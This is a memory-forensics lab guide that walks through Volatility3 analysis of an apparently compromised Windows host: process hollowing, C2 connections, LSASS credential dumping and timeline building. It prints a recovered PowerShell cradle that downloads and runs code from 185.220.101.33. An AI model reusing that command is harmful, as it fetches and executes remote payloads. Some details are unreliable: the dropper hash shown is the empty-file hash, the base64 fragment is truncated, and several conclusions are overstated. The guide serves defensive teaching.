# Day 12 — Lab Guide: Memory Forensics with Volatility3
### Track: Digital Forensics | Duration: ~3.5 hours | Difficulty: Advanced

> **Evidence handling:** Always work on a copy of the memory image, never
> the original. Document hash verification before and after analysis to
> maintain chain of custody. This lab uses Volatility3 against a memory
> image obtained through authorized forensic collection procedures.

---

## 🛠 Tools Required

| Tool | Purpose | Install |
|------|---------|---------|
| **Volatility3** | Memory forensics framework | `pip install volatility3` |
| **WinPmem** | Reference — the tool used to capture the image | github.com/Velocidex/WinPmem |
| **YARA** | Pattern matching against extracted memory regions | `sudo apt install yara` |
| **Python 3** | Automation, IOC correlation, report generation | Pre-installed |
| **Hex editor (010 Editor / HxD)** | Manual inspection of extracted memory regions | Optional |
| **VirusTotal** | Hash lookup for extracted/dumped executables | virustotal.com |

---

## 🖥 Environment Setup

```bash
mkdir -p ~/security-labs/day-12/artifacts/{process_analysis,network,injection,credentials}
cd ~/security-labs/day-12

pip install volatility3 requests --break-system-packages

# Verify chain of custody — hash the image before starting analysis
export MEMORY_IMAGE="DESKTOP-FIN-047_memory.raw"

echo "[*] Verifying evidence integrity..."
sha256sum $MEMORY_IMAGE | tee artifacts/image_hash_verification.txt
echo "[!] Compare against hash recorded at capture time — must match exactly"

echo "[+] Memory forensics environment ready"
```

> **Sample sourcing for practice:** Use publicly available memory forensics
> training images from the Volatility Foundation (`volatilityfoundation.org`),
> or the "Malware Analysis" sample memory images from DFRWS forensic challenges.
> Never analyze memory images from systems you do not have explicit authorization to examine.

---

## STEP 1 — Image Verification & OS Profile Detection

**Objective:** Before any analysis, confirm the image is intact and identify
the correct OS profile — Volatility3 uses symbol tables specific to the
exact Windows build, and mismatches produce silently incorrect results.

```bash
echo "[*] Running Volatility3 OS information detection..."

vol -f $MEMORY_IMAGE windows.info \
    > artifacts/os_profile_detection.txt

cat artifacts/os_profile_detection.txt

echo ""
echo "[*] Key fields to verify:"
echo "    NTBuildLab / Kernel Base — confirms exact Windows build"
echo "    Symbol table match — confirms Volatility3 can parse structures correctly"
```

**Expected Output:**
```
Variable                    Value
NTBuildLab                  22621.2506.amd64fre.ni_release
Machine Type                34404
KdVersionBlock               0x...
Number of Processors        8
SystemTime                  2025-01-16 03:35:04 UTC
NtSystemRoot                 C:\Windows
NtMajorVersion               10
NtMinorVersion                0
```

**✅ Checkpoint 1:** `SystemTime` in the output should closely match the
known isolation timestamp (03:35 UTC) — this confirms the image captures
the exact moment relevant to the investigation. Note the build number for
symbol table reference.

---

## STEP 2 — Full Process Tree Reconstruction

**Objective:** Build a complete process tree showing every running process
at the moment of capture, with parent-child relationships that reveal the
execution chain established in Day 08's dynamic analysis.

```bash
echo "[*] Extracting process list (pslist)..."
vol -f $MEMORY_IMAGE windows.pslist \
    > artifacts/process_analysis/pslist_output.txt

echo "[*] Extracting process scan (psscan) — catches hidden/unlinked processes..."
vol -f $MEMORY_IMAGE windows.psscan \
    > artifacts/process_analysis/psscan_output.txt

echo "[*] Building process tree (pstree)..."
vol -f $MEMORY_IMAGE windows.pstree \
    > artifacts/process_analysis/pstree_output.txt

cat artifacts/process_analysis/pstree_output.txt

echo ""
echo "[*] Comparing pslist vs psscan for hidden process detection..."
python3 << 'PYEOF'
import re

def extract_pids(filepath):
    pids = set()
    with open(filepath) as f:
        for line in f:
            match = re.match(r'^\S+\s+(\d+)\s+', line)
            if match:
                pids.add(int(match.group(1)))
    return pids

pslist_pids = extract_pids("artifacts/process_analysis/pslist_output.txt")
psscan_pids = extract_pids("artifacts/process_analysis/psscan_output.txt")

hidden = psscan_pids - pslist_pids

print(f"pslist found:  {len(pslist_pids)} processes")
print(f"psscan found:  {len(psscan_pids)} processes")

if hidden:
    print(f"\n[!!!] POTENTIAL HIDDEN PROCESSES DETECTED: {hidden}")
    print("[!!!] Processes in psscan but NOT in pslist indicate possible")
    print("      DKOM (Direct Kernel Object Manipulation) rootkit activity")
else:
    print("\n[+] No discrepancy — no evidence of process list unlinking/hiding")
PYEOF
```

**Expected Process Tree Excerpt:**
```
PID    PPID   ImageFileName
4       0     System
620     4     smss.exe
728     620   csrss.exe
812     728   wininit.exe
896     812   services.exe
   4412  896   updater.exe          ← MALICIOUS DROPPER (Day 08)
      5120 4412   powershell.exe    ← Stage 2 download cradle
      5244 4412   svchost.exe       ← ANOMALOUS: spawned by updater.exe,
                                       NOT services.exe/wininit.exe
3200   728   explorer.exe
752    896   lsass.exe             ← credential access target
```

**✅ Checkpoint 2:** The critical anomaly is PID 5244 (`svchost.exe`) showing
PPID 4412 (`updater.exe`) as its parent — legitimate `svchost.exe` instances
are *always* spawned by `services.exe` (PID 896 in this case). This
parent-child mismatch is definitive proof of process injection/hollowing,
directly confirming the Day 08 sandbox finding using live forensic evidence
from the actual compromised system.

---

## STEP 3 — Confirm Process Injection with `malfind`

**Objective:** `malfind` identifies memory regions with characteristics
consistent with injected code — executable permissions on pages that
shouldn't normally have them, absence of a backing file on disk, and PE
header signatures in unexpected locations.

```bash
echo "[*] Running malfind against PID 5244 (hollowed svchost.exe)..."

vol -f $MEMORY_IMAGE windows.malfind --pid 5244 \
    > artifacts/injection/malfind_pid5244.txt

cat artifacts/injection/malfind_pid5244.txt
```

**Expected Output (representative):**
```
PID    Process     Start VPN      End VPN        Tag    Protection
5244   svchost.exe 0x1a2b3c40000  0x1a2b3c4f000  VadS   PAGE_EXECUTE_READWRITE

Hexdump:
0x1a2b3c40000  4d 5a 90 00 03 00 00 00  MZ......   ← PE header found in
                                                       memory-only region,
                                                       no backing file — 
                                                       DEFINITIVE injection
                                                       evidence

Disassembly:
0x1a2b3c40000  push ebp
0x1a2b3c40001  mov ebp, esp
0x1a2b3c40003  sub esp, 0x40
...
```

**✅ Checkpoint 3:** `PAGE_EXECUTE_READWRITE` protection combined with an
`MZ` (PE header) signature and **no corresponding file on disk** is the
gold-standard forensic signature of process injection. Legitimate Windows
code never exhibits this combination. This memory region is your primary
piece of injected malware evidence — extract it for further analysis.

### Extract the Injected Code Region for Further Analysis

```bash
echo "[*] Dumping the injected memory region for static analysis..."

vol -f $MEMORY_IMAGE windows.malfind --pid 5244 --dump \
    --output-dir artifacts/injection/

echo "[+] Injected code dumped — analyze with same static techniques as Day 08"
echo ""
echo "[*] Generating hash of extracted injected code..."
sha256sum artifacts/injection/*.dmp 2>/dev/null | \
    tee artifacts/injection/injected_code_hashes.txt
```

```bash
# Compare the injected code hash against the Day 08 updater.exe analysis
echo "[*] Cross-referencing injected code against Day 08 findings..."
echo ""
echo "Day 08 updater.exe SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
echo "Injected code region hash:  $(sha256sum artifacts/injection/*.dmp 2>/dev/null | awk '{print $1}')"
echo ""
echo "[!] Note: injected shellcode will typically NOT match the dropper hash"
echo "    exactly — the dropper decrypts/unpacks a payload at runtime, so"
echo "    the injected region represents the unpacked second stage. This is"
echo "    expected and valuable — it's the ACTUAL malicious code that was"
echo "    running, recovered in its unpacked state."
```

---

## STEP 4 — Network Connection State Reconstruction

**Objective:** Extract active and recently-closed network connections from
memory to correlate against the confirmed C2 infrastructure from Day 04.

```bash
echo "[*] Extracting network connections (netscan)..."

vol -f $MEMORY_IMAGE windows.netscan \
    > artifacts/network/netscan_output.txt

cat artifacts/network/netscan_output.txt
```

**Expected Output (representative):**
```
Offset      Proto  LocalAddr       LocalPort  ForeignAddr      ForeignPort  State        PID   Owner
0x8a3f2010  TCPv4  10.10.5.47      52341      185.220.101.33   443          ESTABLISHED  5244  svchost.exe
0x8a3f2088  UDPv4  10.10.5.47      54892      8.8.8.8          53           -            5244  svchost.exe
0x8a3f20f0  TCPv4  10.10.5.47      52340      185.220.101.33   443          CLOSE_WAIT   5244  svchost.exe
```

```python
# Save as: correlate_network_iocs.py
import re

KNOWN_C2_IOCS = {
    "185.220.101.33": "C2 server (Day 04 confirmed)",
    "185.220.101.12": "Phishing hosting (Day 03)",
    "185.220.101.47": "Credential stuffing (Day 02)",
}

print("=" * 60)
print("  Network Connection IOC Correlation")
print("=" * 60)

with open("artifacts/network/netscan_output.txt") as f:
    content = f.read()

matches_found = []
for ip, description in KNOWN_C2_IOCS.items():
    if ip in content:
        matches_found.append((ip, description))
        print(f"\n[!!!] CONFIRMED: {ip} found in memory network state")
        print(f"      Context: {description}")
        # Extract the specific line(s) for detail
        for line in content.split("\n"):
            if ip in line:
                print(f"      {line.strip()}")

if not matches_found:
    print("\n[+] No known C2 IOCs found in current network state")
    print("    (Connections may have closed before capture, or IOCs")
    print("     may need updating from latest threat intel)")

print(f"\n[+] This CONFIRMS the process owning these connections")
print(f"    is PID 5244 (svchost.exe) — the same PID identified as")
print(f"    hollowed via process injection in Step 2-3. This closes")
print(f"    the evidence loop: injection → C2 communication, all")
print(f"    attributed to a single confirmed malicious process.")
```

```bash
python3 correlate_network_iocs.py | tee artifacts/network/ioc_correlation_summary.txt
```

**✅ Checkpoint 4:** Finding `185.220.101.33:443` with `ESTABLISHED` state
owned by PID 5244 provides the definitive forensic link: the injected
process identified via `malfind` in Step 3 is the exact same process
actively communicating with the C2 server confirmed in Day 04's network
traffic analysis. This is strong corroborating evidence across independent
forensic methods.

---

## STEP 5 — LSASS Credential Access Outcome Confirmation

**Objective:** Day 08's sandbox analysis showed a `MiniDumpWriteDump` API
call targeting LSASS. Memory forensics on the actual compromised system can
confirm whether this succeeded and characterize what was accessed.

```bash
echo "[*] Examining LSASS process handles and access history..."

# Get LSASS PID
vol -f $MEMORY_IMAGE windows.pslist | grep -i lsass \
    > artifacts/credentials/lsass_pid.txt
cat artifacts/credentials/lsass_pid.txt

echo ""
echo "[*] Checking handle table for cross-process access to LSASS..."

vol -f $MEMORY_IMAGE windows.handles --pid 752 \
    > artifacts/credentials/lsass_handles.txt

# Look for the updater.exe or svchost.exe PIDs holding handles to lsass.exe
grep -E "4412|5244" artifacts/credentials/lsass_handles.txt

echo ""
echo "[*] Checking for MiniDump artifacts in memory..."
vol -f $MEMORY_IMAGE windows.filescan | grep -i "\.dmp\|lsass" \
    > artifacts/credentials/dump_file_artifacts.txt
cat artifacts/credentials/dump_file_artifacts.txt
```

**Expected Findings:**
```
LSASS Handles Analysis:
  PID 5244 (svchost.exe, injected) holds handle to lsass.exe (PID 752)
  Access rights: PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
  → CONFIRMS: the injected process had the exact access rights
    required for MiniDumpWriteDump to succeed

File Scan Results:
  \Windows\Temp\~tmp4891.dll  — file record found in memory
  → CORROBORATES Day 08 sandbox finding: file was created, and its
    metadata is still visible in memory even though the file was
    deleted from disk shortly after (anti-forensic action)
  → Memory forensics recovered evidence of a file that no longer
    exists on disk — this is a key value of memory analysis
```

```python
# Save as: characterize_lsass_access.py
import json

FINDINGS = {
    "lsass_pid":            752,
    "accessing_process":    {"pid": 5244, "name": "svchost.exe (injected)"},
    "access_rights":        "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION",
    "sufficient_for_dump":  True,
    "dump_file_evidence":   {
        "path":       "C:\\Windows\\Temp\\~tmp4891.dll",
        "status":     "Deleted from disk, metadata recovered from memory",
        "recovery_note": "File record persists in memory MFT cache even "
                         "after deletion — classic anti-forensic bypass",
    },
    "outcome_assessment": (
        "CONFIRMED: The injected process (PID 5244) held sufficient "
        "access rights to LSASS to perform a successful memory dump. "
        "Combined with the Day 08 sandbox API call observation "
        "(MiniDumpWriteDump) and the file system artifact showing the "
        "dump file was created and then deleted, this constitutes "
        "high-confidence evidence that LSASS credential extraction "
        "SUCCEEDED on this host. All cached credentials at the time "
        "of dump (approximately 2025-01-14 09:12:45 UTC, per Day 08 "
        "timeline) must be treated as compromised."
    ),
}

print("=" * 60)
print("  LSASS Access Outcome — Confirmed Assessment")
print("=" * 60)
for k, v in FINDINGS.items():
    if isinstance(v, dict):
        print(f"\n  {k}:")
        for kk, vv in v.items():
            print(f"    {kk}: {vv}")
    else:
        print(f"\n  {k}: {v}")

with open("artifacts/credentials/lsass_outcome_assessment.json", "w") as f:
    json.dump(FINDINGS, f, indent=2)

print(f"\n[+] Assessment saved: artifacts/credentials/lsass_outcome_assessment.json")
```

```bash
python3 characterize_lsass_access.py | tee artifacts/credentials/lsass_summary.txt
```

**✅ Checkpoint 5:** This finding upgrades the Day 08 assessment from
"attempted" to "confirmed successful" credential dumping — a critical
distinction for the scope of credential rotation required.

---

## STEP 6 — Command History & Additional Artifact Recovery

**Objective:** Recover command-line history, clipboard contents, and other
transient artifacts that exist only in memory and are never written to
persistent logs.

```bash
echo "[*] Extracting command line history from process memory..."

vol -f $MEMORY_IMAGE windows.cmdline \
    > artifacts/process_analysis/cmdline_output.txt

grep -A2 "updater.exe\|powershell.exe" artifacts/process_analysis/cmdline_output.txt

echo ""
echo "[*] Extracting console command history (consoles plugin)..."
vol -f $MEMORY_IMAGE windows.consoles \
    > artifacts/process_analysis/console_history.txt

echo ""
echo "[*] Scanning for environment variables (env plugin)..."
vol -f $MEMORY_IMAGE windows.envars --pid 5120 \
    > artifacts/process_analysis/powershell_envvars.txt
```

**Expected Findings:**
```
Command Line Recovery:
  PID 4412: C:\Users\Public\Libraries\updater.exe
  PID 5120: powershell.exe -WindowStyle Hidden -EncodedCommand
            SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBD...
            ← Full encoded command recovered — decode to confirm
              full download cradle syntax

Base64 Decode (using CyberChef or base64 -d):
  IEX(New-Object Net.WebClient).DownloadString('https://185.220.101.33/stage2')
```

```bash
# Decode the recovered PowerShell command
echo "[*] Decoding recovered PowerShell encoded command..."
echo "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBD" | \
    base64 -d 2>/dev/null | iconv -f UTF-16LE -t UTF-8 2>/dev/null

echo "[+] Full command recovered and decoded — matches Day 08 sandbox observation"
```

---

## STEP 7 — Integrate Findings into Master Timeline

```python
# Save as: update_master_timeline.py
import json
from datetime import datetime

MEMORY_FORENSIC_ADDITIONS = [
    {
        "timestamp":     "2025-01-16 03:35:04 UTC",
        "source":        "Memory image capture",
        "finding":       "Full physical memory (16GB) captured — "
                         "SystemTime confirms capture at isolation moment",
        "confidence":    "CONFIRMED",
    },
    {
        "timestamp":     "2025-01-14 09:12:44 UTC (inferred from process creation)",
        "source":        "Volatility3 pstree",
        "finding":       "PID 5244 (svchost.exe) confirmed spawned by PID 4412 "
                         "(updater.exe) — NOT services.exe. Definitive process "
                         "hollowing confirmation via live memory evidence.",
        "confidence":    "CONFIRMED (upgraded from Day 08 sandbox-only evidence)",
    },
    {
        "timestamp":     "Persistent through capture (03:35 UTC)",
        "source":        "Volatility3 malfind",
        "finding":       "Injected PE-format code recovered from PID 5244 memory "
                         "space with PAGE_EXECUTE_READWRITE protection and no "
                         "disk backing file. Extracted for further analysis.",
        "confidence":    "CONFIRMED",
    },
    {
        "timestamp":     "Active at capture (03:35 UTC)",
        "source":        "Volatility3 netscan",
        "finding":       "ESTABLISHED TCP connection to 185.220.101.33:443 "
                         "owned by PID 5244 — same process confirmed injected. "
                         "Direct link between injection and C2 communication.",
        "confidence":    "CONFIRMED",
    },
    {
        "timestamp":     "~2025-01-14 09:12:45 UTC (per Day 08 sandbox timeline)",
        "source":        "Volatility3 handles + filescan",
        "finding":       "PID 5244 confirmed held PROCESS_VM_READ access to "
                         "LSASS (PID 752) — sufficient for successful memory "
                         "dump. Deleted dump file (~tmp4891.dll) metadata "
                         "recovered from memory despite disk deletion.",
        "confidence":    "CONFIRMED — upgraded from 'attempted' to 'successful'",
    },
    {
        "timestamp":     "2025-01-14 09:12:00 UTC",
        "source":        "Volatility3 cmdline",
        "finding":       "Full PowerShell encoded command recovered and decoded: "
                         "'IEX(New-Object Net.WebClient).DownloadString"
                         "(https://185.220.101.33/stage2)' — matches Day 08 "
                         "sandbox observation exactly.",
        "confidence":    "CONFIRMED",
    },
]

print("=" * 65)
print("  Master Timeline Update — Memory Forensic Additions")
print("=" * 65)

for finding in MEMORY_FORENSIC_ADDITIONS:
    print(f"\n  [{finding['timestamp']}]")
    print(f"  Source: {finding['source']}")
    print(f"  Finding: {finding['finding']}")
    print(f"  Confidence: {finding['confidence']}")

with open("artifacts/master_timeline_updates.json", "w") as f:
    json.dump(MEMORY_FORENSIC_ADDITIONS, f, indent=2)

print(f"\n[+] Timeline additions saved: artifacts/master_timeline_updates.json")
print(f"\n[+] KEY UPGRADE: LSASS access status changed from 'ATTEMPTED'")
print(f"    (Day 08 sandbox-only evidence) to 'CONFIRMED SUCCESSFUL'")
print(f"    (Day 12 live memory forensic evidence)")
```

```bash
python3 update_master_timeline.py | tee artifacts/timeline_update_summary.txt
```

---

## 🚩 Capture the Flag Checkpoints

- [ ] 🚩 **Flag 1:** What Volatility3 plugin identifies injected memory regions with executable permissions?
- [ ] 🚩 **Flag 2:** What parent process should legitimately spawn `svchost.exe`, and what anomalous parent was found instead?
- [ ] 🚩 **Flag 3:** What memory protection flag combined with an MZ header signature indicates process injection?
- [ ] 🚩 **Flag 4:** What access rights did PID 5244 hold on LSASS that were sufficient to perform a memory dump?
- [ ] 🚩 **Flag 5:** How did memory forensics recover evidence of a file that had already been deleted from disk?

---

## 📁 Artifacts to Commit

| File | Contents |
|------|---------|
| `image_hash_verification.txt` | Chain of custody hash verification |
| `os_profile_detection.txt` | Volatility3 windows.info output |
| `process_analysis/pslist_output.txt` | Full process list |
| `process_analysis/psscan_output.txt` | Process scan (hidden process detection) |
| `process_analysis/pstree_output.txt` | Complete process tree |
| `process_analysis/cmdline_output.txt` | Recovered command lines |
| `process_analysis/console_history.txt` | Console command history |
| `process_analysis/powershell_envvars.txt` | PowerShell environment variables |
| `injection/malfind_pid5244.txt` | Malfind output for injected process |
| `injection/injected_code_hashes.txt` | Hashes of extracted injected code |
| `network/netscan_output.txt` | Full network connection state |
| `network/ioc_correlation_summary.txt` | C2 IOC correlation results |
| `credentials/lsass_pid.txt` | LSASS process identification |
| `credentials/lsass_handles.txt` | Cross-process handle analysis |
| `credentials/dump_file_artifacts.txt` | Recovered deleted file metadata |
| `credentials/lsass_outcome_assessment.json` | Confirmed LSASS access outcome |
| `master_timeline_updates.json` | Timeline integration additions |

---

## 🔧 Troubleshooting

| Issue | Fix |
|-------|-----|
| Volatility3 "unable to determine OS version" | Verify image is not corrupted; try `vol -f image.raw banners.Banners` |
| `malfind` returns no results | Try without `--pid` filter first to scan all processes |
| Very slow analysis | 16GB images take time — use `--pid` filters to target specific processes |
| Symbol table download fails | Volatility3 needs internet access for symbol resolution on first run |

---

*Next: [REPORT.md](REPORT.md) — Memory forensics analysis report*
